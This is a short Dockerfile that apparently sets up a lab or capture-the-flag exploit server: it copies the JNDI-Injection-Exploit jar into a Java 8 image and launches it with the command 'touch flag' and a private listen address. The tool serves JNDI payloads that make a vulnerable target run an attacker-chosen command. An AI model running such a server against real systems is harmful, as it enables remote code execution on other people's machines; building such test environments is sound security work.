FROM openjdk:8-jdk

WORKDIR /app

COPY JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar /app/app.jar

CMD ["java", "-jar", "/app/app.jar", "-C", "touch flag", "-A", "10.0.0.3"]
